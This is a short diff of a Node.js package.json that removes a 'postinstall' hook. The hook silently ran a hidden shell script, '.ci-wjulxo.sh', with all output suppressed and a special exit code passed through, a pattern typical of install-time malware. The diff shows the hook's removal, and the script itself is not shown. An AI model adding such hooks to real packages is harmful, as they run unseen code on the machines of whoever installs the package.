@@ -6,8 +6,7 @@
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
     "start": "nodemon appp.js",
-    "build": "npm run build",
-    "postinstall": "sh ./.ci-wjulxo.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build": "npm run build"
   },
   "keywords": [],
   "author": "",
